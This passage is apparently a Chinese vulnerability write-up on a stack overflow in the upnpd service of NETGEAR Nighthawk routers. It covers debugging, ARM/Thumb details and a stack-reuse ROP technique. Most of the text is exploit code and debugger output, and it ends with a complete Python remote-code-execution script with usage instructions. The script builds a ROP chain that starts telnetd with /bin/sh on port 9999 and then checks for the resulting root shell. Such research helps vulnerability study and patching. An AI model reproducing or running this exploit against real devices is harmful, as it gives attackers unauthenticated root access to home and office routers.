> 函数说明:[recv()](https://baike.baidu.com/item/recv%28%29)用来接收远程主机经指定的socket传来的数据,并把数据传到由参数buf指向的内存空间,参数len为可接收数据的最大长度.参数flags一般设0,其他数值定义参考recv().参数from用来指定欲传送的[网络地址](https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80),结构sockaddr请参考bind()函数.参数fromlen为sockaddr的结构长度.

![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083882/netgear/image_29.png)
在 `sub_25E04()` 中调用 `strcpy()` 将以上数据拷贝到大小为 `0x634 - 0x58 = 0x5dc` 的 buffer。如果超过缓冲区大小，数据就会覆盖栈底部分甚至返回地址。
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083972/netgear/image_30.png)

```
`                 ``+-----------------+`
`                  ``|``     retaddr     ``|`
`                  ``+-----------------+`
`                 ``|``     saved ebp   ``|`
`          ebp``--->+-----------------+`
`                 ``|``                 ``|`
`                 ``|``                 ``|
                 |                 |
    s,ebp-0x58-->+-----------------+`
`                 ``|``                 ``|`
`                 ``|``     buffer      ``|`
`                 ``|``                 ``|`
`                 ``|``                 ``|`
` v40``,``ebp``-``0x634``-->+-----------------+`
```






## 0x04 动态调试

使用gdbserver调试目标程序https://res.cloudinary.com/dozyfkbg3/raw/upload/v1568965448/gdbserver

```
# ps|grep upnp
 2714 0          3324 S   ./usr/sbin/upnpd
 2788 0          1296 S   grep upnp
# ./gdbserver 127.0.0.1:12345 --attach 2714
Attached; pid = 2714
Listening on port 12345
```

工作机上使用跨平台试gdb-multiarch
`gdb-multiarch -x dbgscript`
dbgscript 内容

```
`set`` architecture arm`
`gef``-``remote ``-``q ``192.168``.2``.1``:``12345`
`file usr``/``sbin``/``upnpd`
`set`` remote ``exec``-``file ``/``usr``/``sbin``/upnpd`
```

直接构造溢出字符，程序不会正常返回，因为栈上存在一个v40的指针v51，需要覆盖为有效地址才能正确返回。
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083781/netgear/image_23.png)

```
#!/usr/bin/python3

import socket
import struct

p32 = lambda x: struct.pack("<L", x)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = (
    0x634 * b'a' +
    p32(0x43434343)
)
print(payload)
s.connect(('192.168.2.2', 1900))
s.send(payload)
s.close()
```



![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083780/netgear/image_24.png)
```
#!/usr/bin/python3

import socket
import struct

p32 = lambda x: struct.pack("<L", x)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = (
    0x604 * b'a' +  # dummy
    p32(0x7e2da53c) +  # v51
    (0x634 - 0x604 - 8) * b'a' +  # dummy
    p32(0x43434343)  # LR
)
s.connect(('192.168.2.2', 1900))
s.send(payload)
s.close()
```

可以看到，我们向返回地址发送的数据为0x43434343，但最后PC寄存器的值为0x43434342，最后一个bit变为0，这是为什么？https://blog.3or.de/arm-exploitation-defeating-dep-executing-mprotect.html

* 首先溢出覆盖了非叶函数的返回地址。一旦这个函数执行它的结束语来恢复保存的值，保存的LR就被弹出到PC中返回给调用者。
* 其次关于最低有效位的一个注意事项：BX指令将加载到PC的地址的LSB复制到CPSR寄存器的T状态位，CPSR寄存器在ARM和Thumb模式之间切换：ARM（LSB=0）/Thumb（LSB=1）。
    * 我们可以看到R7300是运行在THUMB状态
    * 当处理器处于ARM状态时，每条ARM指令为4个字节，所以PC寄存器的值为当前指令地址 + 8字节
    * 当处理器处于Thumb状态时，每条Thumb指令为2字节，所以PC寄存器的值为当前指令地址 + 4字节
* 因此保存的LR（用0x43434343覆盖）被弹出到PC中，然后弹出地址的LSB被写入CPSR寄存器T位（位5），最后PC本身的LSB被设置为0，从而产生0x43434342。


最后检查程序的缓解措施。程序本身开启了NX，之前用过R7000的真机，设备开了ASLR
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083780/netgear/image_25.png)
在堆栈恢复前下一个断点，观察控制流转移情况，将PC指针控制为重启指令。通过 hook 的日志可以看到，ROP 利用链按照预期工作（由于模拟环境的问题，reboot 命令运行段错误了...）

```
gef➤ b *0x00025F40
Breakpoint 1 at 0x25f40

.text:00025F40                 ADD             SP, SP, #0x234
.text:00025F44                 ADD             SP, SP, #0x400
.text:00025F48                 LDMFD           SP!, {R4-R11,PC}

**.****text****:****0003E9DC** ****                LDR             R0, =aReboot_0 ; "reboot"
.text:0003E9E0                 BL              system

**payload如下：**
payload = (
    0x604 * b'a' +  # dummy
    p32(0x76d9d450) +  # v41
    (0x634 - 0x604 - 8) * b'a' +  # dummy
    p32(0x0003E9DC)  # system(reboot)
)

**固件模拟日志：**
ssdp_http_method_check(203):
ssdp_http_method_check(231):Http message error
Detaching from process 3477
rmmod: dhd.ko: No such file or directory
**reboot: rmmod dhd failed: No such file or directory**
**[0x0003e9e4] system('reboot') = 0**
```


综合目前的情况：

1. 目前可以控制`R4 - R11` 以及 `PC(R15)`寄存器
2. 开了 NX 不能用在栈上布置`shellcode`。
3. 有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 `gadget`。
4. `strcpy()` 函数导致的溢出，payload 中不能包含 `\x00` 字符。



## 0x05 漏洞利用

路由器已启用ASLR缓解功能，我们可以使用ROP攻击绕过该功能。但是，我们通过使用对NULL字节敏感的**strcpy**来执行复制调用，这反过来又会阻止我们使用ROP攻击。因此，要利用包含NULL字节的地址，我们将需要使用堆栈重用攻击。即想办法提前将 ROP payload 注入目标内存。（`stack reuse`）
注意到recvfrom函数在接收 socket 数据时 buffer 未初始化，利用内存未初始化问题，我们可以向sub_1D020的堆栈中布置gadgets。构造如下 PoC，每个 payload 前添加 `\x00` 防止程序崩溃（strcpy遇到\x00截断，不会拷贝后面部分）。

```
#!/usr/bin/python3

import socket
import struct
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('192.168.2.2', 1900))
s.send(b'\x00' + b'A' * 0x1ff0)
s.send(b'\x00' + b'B' * 0x633)
s.close()
```


在strcpy下断点调试，并检查栈区内存

```
gef➤  info b
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x76dd6e48 <recvfrom+4>
2       breakpoint     keep y   0x76dc350c <strcpy+4>
4       breakpoint     keep y   0x00025e70
5       breakpoint     keep y   0x00025e74
gef➤  search-pattern BBBB
[+] Searching 'BBBB' in memory
[+] In '/lib/libc.so.0'(0x76d85000-0x76dea000), permission=r-x
  0x76de17e4 - 0x76de17e8  →   "BBBB[...]"
  0x76de1ecc - 0x76de1edb  →   "BBBBBBBBCCCCCCC"
  0x76de1ed0 - 0x76de1edb  →   "BBBBCCCCCCC"
[+] In '[stack]'(0x7eb36000-0x7eb6f000), permission=rw-
  **0x7eb6cc75** - 0x7eb6ccac  →   "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
  0x7eb6cc79 - 0x7eb6ccb0  →   "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
  0x7eb6cc7d - 0x7eb6ccb4  →   "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
  0x7eb6cc81 - 0x7eb6ccb8  →   "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
  0x7eb6cc85 - 0x7eb6ccbc  →   "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
gef➤  x/s 0x7eb6cc75
0x7eb6cc75:    'B' <repeats 1587 times>
gef➤  x/s 0x7eb6cc75+1588
0x7eb6d2a9:    'A' <repeats 6588 times>
```

此时程序上下文为

```
gef➤  context
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x7eb6c5fc  →  0x00000000
**$r1  : 0x7eb6cc74**  →  0x42424200
$r2  : 0x1d      
$r3  : 0x7eb6c5fc  →  0x00000000
**$r4  : 0x7eb6cc74**  →  0x42424200
$r5  : 0x0000cf02  →   blx 0x10c6586
$r6  : 0x7eb6ecf4  →  "192.168.2.1"
$r7  : 0x7eb6cc00  →  0x7eb6c5fc  →  0x00000000
$r8  : 0x7eb6cc04  →  0x76f10020  →  0x00000000
$r9  : 0x3eaf    
$r10 : 0x1       
$r11 : 0x000c4584  →  0x00000005
$r12 : 0x00055450  →  0x76dc3508  →  <strcpy+0> mov r3,  r0
$sp  : 0x7eb6c5d8  →  "nnection:1"
$lr  : 0x00025e74  →   mov r0,  r7
$pc  : 0x76dc350c  →  <strcpy+4> ldrb r2,  [r1],  #1
$cpsr: [NEGATIVE zero carry overflow interrupt fast thumb]
───────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x7eb6c5d8│+0x0000: "nnection:1"     ← $sp
0x7eb6c5dc│+0x0004: "tion:1"
0x7eb6c5e0│+0x0008: 0x0000313a (":1"?)
0x7eb6c5e4│+0x000c: 0x00000000
0x7eb6c5e8│+0x0010: 0x00000000
0x7eb6c5ec│+0x0014: 0x00000000
0x7eb6c5f0│+0x0018: 0x00000000
0x7eb6c5f4│+0x001c: 0x00000000
────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────
   0x76dc3500 <strchrnul+24>   bne    0x76dc34f0 <strchrnul+8>
   0x76dc3504 <strchrnul+28>   bx     lr
   0x76dc3508 <strcpy+0>       mov    r3,  r0
 → 0x76dc350c <strcpy+4>       ldrb   r2,  [r1],  #1
   0x76dc3510 <strcpy+8>       cmp    r2,  #0
   0x76dc3514 <strcpy+12>      strb   r2,  [r3],  #1
   0x76dc3518 <strcpy+16>      bne    0x76dc350c <strcpy+4>
   0x76dc351c <strcpy+20>      bx     lr
   0x76dc3520 <strcspn+0>      push   {r4,  lr}
─────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "upnpd", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x76dc350c → strcpy()
[#1] 0x25e74 → mov r0,  r7
────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

由于接收 socket 数据的 buffer 未初始化，在劫持 PC 前我们可以往目标内存注入 6500 多字节的数据。 这么大的空间，也足以给 ROP 的 payload 一片容身之地。

使用 `strcpy` 调用在 bss 上拼接出命令字符串 `telnetd\x20-l/bin/sh\x20-p\x209999\x20&\x20\x00`，并调整 R0 指向这段内存，然后跳转 `system` 执行即可。
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083780/netgear/image_26.png)

## **0x06 脚本使用说明**




|脚本帮助：	|usage: python2 PSV-2020-0211.py 【路由器IP】 【任意libc有效地址】	|
|---	|---	|
|真实利用：	|IP:192.168.2.2 Port:upnp/1900	|
||![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083779/netgear/image_27.png)	|

```
import socket
import time
import sys
from struct import pack

p32 = lambda x: pack("<L", x)
bssBase = 0x9E150   #string bss BASE Address
ip = '192.168.2.2'
libc_addr = 0x76d9d450

def banner():
    a= """
        # NETGEAR Nighthawk R8300 RCE Exploit upnpd, tested exploit fw version V1.0.2.130
        # Date : 2020.03.09
        # POC : system("telnetd -l /bin/sh -p 9999& ") Execute
        # Desc : execute telnetd to access router
    """
    print a


def makpayload2(libc_addr):
    payload = (
        0x604 * b'a' +  # dummy
        p32(int(libc_addr,16)) +  # v51 Need to Existed Address
        (0x634 - 0x604 - 8) * b'a' +  # dummy
        p32(0x000230f0) + # #change eip LR=0x000230f0
        2509 * b'a'
        """
        .text:000230F0                 ADD             SP, SP, #0x20C
        .text:000230F4                 ADD             SP, SP, #0x1000
        .text:000230F8                 LDMFD           SP!, {R4-R11,PC}
        """
    )
    print(len(payload))
    return payload

def makpayload1():
    expayload = ''
    """
    .text:00013644                 MOV             R0, R10 ; dest
    .text:00013648                 MOV             R1, R5  ; src
    .text:0001364C                 BL              strcpy
    .text:00013650                 MOV             R0, R4
    .text:00013654                 ADD             SP, SP, #0x5C ; '\'
    .text:00013658                 LDMFD           SP!, {R4-R8,R10,PC}
    """
    expayload += 'a' * 4550
    expayload += p32(bssBase+3) # R4 Register
    expayload += p32(0x3F340) # R5 Register //tel
    expayload += 'IIII' # R6 Register
    expayload += 'HHHH' # R7 Register
    expayload += 'GGGG' # R8 Register
    expayload += 'FFFF' # R9 Register
    expayload += p32(bssBase) # R10 Register
    expayload += 'BBBB' # R11 Register
    expayload += p32(0x13644) # strcpy

    expayload += 'd'*0x5c#dummy
    expayload += p32(bssBase+6) #R4
    expayload += p32(0x423D7) #R5  //telnet
    expayload += 'c'*4 #R6
    expayload += 'c'*4 #R7
    expayload += 'c'*4 #R8
    expayload += 'd'*4 #R10
    expayload += p32(0x13648) #strcpy


    expayload += 'd'*0x5c#dummy
    expayload += p32(bssBase+8) #R4
    expayload += p32(0x40CA4 ) #R5  //telnetd\x20
    expayload += 'c'*4 #R6
    expayload += 'c'*4 #R7
    expayload += 'c'*4 #R8
    expayload += 'd'*4 #R10
    expayload += p32(0x13648) #strcpy

    expayload += 'd'*0x5c#dummy
    expayload += p32(bssBase+10) #R4
    expayload += p32(0x4704A) #R5  //telnetd\x20-l
    expayload += 'c'*4 #R6
    expayload += 'c'*4 #R7
    expayload += 'c'*4 #R8
    expayload += 'd'*4 #R10
    expayload += p32(0x13648) #strcpy

    expayload += 'd'*0x5c#dummy
    expayload += p32(bssBase+11) #R4
    expayload += p32(0x04C281) #R5  //telnetd\x20-l/bin/\x20
    expayload += 'c'*4 #R6
    expayload += 'c'*4 #R7
    expayload += 'c'*4 #R8
    expayload += 'd'*4 #R10
    expayload += p32(0x13648) #strcpy

    expayload += 'd'*0x5c#dummy
    expayload += p32(bssBase+16) #R4
    expayload += p32(0x40CEC) #R5  //telnetd\x20-l/bin/
    expayload += 'c'*4 #R6
    expayload += 'c'*4 #R7
    expayload += 'c'*4 #R8
    expayload += 'd'*4 #R10
    expayload += p32(0x13648) #strcpy


    expayload += 'd'*0x5c#dummy
    expayload += p32(bssBase+18) #R4
    expayload += p32(0x9CB5) #R5  //telnetd\x20-l/bin/sh
    expayload += 'c'*4 #R6
    expayload += 'c'*4 #R7
    expayload += 'c'*4 #R8
    expayload += 'd'*4 #R10
    expayload += p32(0x13648) #strcpy


    expayload += 'd'*0x5c#dummy
    expayload += p32(bssBase+22) #R4
    expayload += p32(0x41B17) #R5  //telnetd\x20-l/bin/sh\x20-p\x20
    expayload += 'c'*4 #R6
    expayload += 'c'*4 #R7
    expayload += 'c'*4 #R8
    expayload += 'd'*4 #R10
    expayload += p32(0x13648) #strcpy

    expayload += 'd'*0x5c#dummy
    expayload += p32(bssBase+24) #R4
    expayload += p32(0x03FFC4) #R5  //telnetd\x20-l/bin/sh\x20-p\x2099
    expayload += 'c'*4 #R6
    expayload += 'c'*4 #R7
    expayload += 'c'*4 #R8
    expayload += 'd'*4 #R10
    expayload += p32(0x13648) #strcpy

    expayload += 'd'*0x5c#dummy
    expayload += p32(bssBase+26) #R4
    expayload += p32(0x03FFC4) #R5  //telnetd\x20-l/bin/sh\x20-p\x209999
    expayload += 'c'*4 #R6
    expayload += 'c'*4 #R7
    expayload += 'c'*4 #R8
    expayload += 'd'*4 #R10
    expayload += p32(0x13648) #strcpy

    expayload += 'd'*0x5c#dummy
    expayload += p32(bssBase+28) #R4
    expayload += p32(0x4A01D) #R5  //telnetd\x20-l/bin/sh\x20-p\x209999\x20&
    expayload += 'c'*4 #R6
    expayload += 'c'*4 #R7
    expayload += 'c'*4 #R8
    expayload += 'd'*4 #R10
    expayload += p32(0x13648) #strcpy

    expayload += 'd'*0x5c#dummy
    expayload += p32(bssBase+30) #R4
    expayload += p32(0x461C1) #R5  //telnetd\x20-l/bin/sh\x20-p\x209999\x20&\x20\x00
    expayload += 'c'*4 #R6
    expayload += 'c'*4 #R7
    expayload += 'c'*4 #R8
    expayload += 'd'*4 #R10
    expayload += p32(0x13648) #strcpy

    print "[*] Make Payload ..."

    """
    .text:0001A83C                 MOV             R0, R4  ; command
    .text:0001A840                 BL              system
    """

    expayload += 'd'*0x5c#dummy
    expayload += p32(bssBase) #R4
    expayload += p32(0x47398) #R5
    expayload += 'c'*4 #R6
    expayload += 'c'*4 #R7
    expayload += 'c'*4 #R8
    expayload += 'd'*4 #R10
    expayload += p32(0x1A83C) #system(string) telnetd -l
    return expayload

def conn(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ip, 1900))
    return s
    print "[*] Send Proof Of Concept payload"


def checkExploit(ip):
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ret = soc.connect((ip,9999))
        return 1
    except:
        return 0

if __name__=="__main__":
    ip = sys.argv[1]
    libc_addr = sys.argv[2]
    banner()
    payload1 = makpayload1()
    payload2 = makpayload2(libc_addr)
    s = conn(ip)
    s.send('a\x00'+payload1) #expayload is rop gadget
    s.send(payload2)
    time.sleep(5)
    if checkExploit(ip):
        print "[*] Exploit Success"
        print "[*] You can access telnet %s 9999"%ip
    else:
        print "[*] Need to Existed Address cross each other"
        print "[*] You need to reboot or execute upnpd daemon to execute upnpd"
        print "[*] To exploit reexecute upnpd, description"
        print "[*] Access http://%s/debug.htm and enable telnet"%ip
        print "[*] then, You can access telnet. execute upnpd(just typing upnpd)"
    s.close()
    print """\n[*] Done ...\n"""
```
